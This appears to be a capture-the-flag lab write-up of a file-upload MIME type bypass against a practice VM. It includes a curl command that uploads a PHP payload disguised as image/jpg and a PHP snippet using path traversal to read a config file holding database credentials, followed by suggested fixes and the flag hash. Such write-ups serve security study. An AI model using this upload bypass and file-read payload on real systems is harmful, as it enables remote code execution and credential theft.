# MIME Type Poisoning

## Flag

46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

## Description

In the RFI episode, we noticed that the php version is at least 7.0.0.
Null byte poisoning is therefore impossible, no pwned.php%00.jpg, too bad.
But this page is vulnerable to MIME type poisoning, allowing us to inject some .php payload by forcing them to be detected as image/jpg files.

## URL

http://192.168.56.101/index.php?page=upload

## Steps To Reproduce

curl -F "Upload=Upload" -F "uploaded=@lidlpayload.php;type=image/jpg" "192.168.56.101/?page=upload#"

1 line, 1 kill.
As bittersweet as my Epinettes' LIDL olive bread memories.

## Why is it dangerous ?

If there is some gallery pages, you can execute your injected scripts by clicking them.
As long as you can execute php code remotely, nothing is impossible, "Just do it !" like someone familiar said :
```
<?php

echo highlight_file("../../../../../../../config.php");
```
Oops ! Someone seems to forgot his MySQL credentials... 

## Possible fixes

- Verify file extention (No null byte in php7, file can be corrupted or a .php renamed in .jpg, but the browser will not execute it and the issue will not be exploitable)
- Additionaly, manually parse file headers depending on their extention, some libraries make this simple, a good point is that it avoids corrupted images as well.

## Resources

- lidlpayload.php (Ressources folder)